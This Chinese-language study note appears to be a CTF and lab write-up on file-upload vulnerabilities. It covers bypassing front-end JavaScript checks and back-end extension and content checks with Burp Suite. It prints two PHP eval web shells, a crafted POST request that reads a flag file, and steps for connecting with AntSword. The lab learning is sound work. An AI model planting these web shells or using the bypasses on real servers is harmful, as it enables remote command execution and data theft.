## 文件上传漏洞

利用木马:

```php
<?php eval ($_POST['cmd']); ?> // virus.php
```



### 绕过

检查分为后端验证与前端验证两种.

前端验证一般包含于Javascript中, 后端验证一般包含于Java或者php中.

#### 前端

控制台网络窗口, 若看不到相应的收发包记录即判定为前端验证.

![image-20240401135704994](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401135704994.png)

可在调试器窗口查看前端代码:

![](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401105957061.png)





<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401110042075.png" alt="image-20240401110042075" style="zoom:50%;" />

由于在向服务器发起下一次请求之前，前端的静态脚本不会被重新加载。

故我们可以在控制台重写JavaScript代码.

![image-20240401110511802](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401110511802.png)

我们考虑将$virus.php$改为$virus.jpg$,先绕过前端验证,考虑用burpsuite拦截:

![image-20240401111317227](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401111317227.png)

为了使其在服务器端可执行, 我们需要在拦截的包中改回后缀php:

![image-20240401111410317](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401111410317.png)

接着拿到木马文件在服务器端的存储位置:

![image-20240401111550836](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401111550836.png)

![image-20240401111618365](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401111618365.png)

#### 后端绕过

以https://buuoj.cn/challenges#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Upload 为例.

我们随便上传个.txt，发现有收发包，即可判断存在后端验证.

![image-20240401140702798](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401140702798.png)

接着把照片木马上传, 在burpsuite上截包然后改后缀, 发现回显可以判断出<?符号
![image-20240401141917942](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401141917942.png)

我们考虑注入phtml，编写脚本:

```php+HTML
<script language='php'>@eval($_POST['cmd']);</script>

```

同样使用burp截包, 并在包里改后缀:

![image-20240401142334040](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401142334040.png)

发现后端对图片内容进行了检查.

![image-20240401142423368](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401142423368.png)

改写图片内容:

![image-20240401142547375](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401142547375.png)

点击forword,成功上传.

我们在AntSword中测试链接:

![image-20240401143225646](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401143225646.png)

接着注入，查看服务器端内容即可.

![image-20240401143305121](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401143305121.png)

#### 利用

我们构造数据包:

#### POST参数

```http
POST /upload-labs/upload/virus.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

cmd=echo file_get_contents("../../labs/UploadAttack/flag.txt");
```

回显了flag:

![image-20240401112741187](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401112741187.png)

利用蚁剑AntSword实现批量注入:

我们上传木马后, 通过AntSword 根据POST关键字实现连接:
![image-20240401115227742](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401115227742.png)

利用AntSword查看服务器中的内容:

![image-20240401115257963](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240401115257963.png)

注意AntSword连接密码只能使用POST参数, 且服务器端木马必须是php脚本.
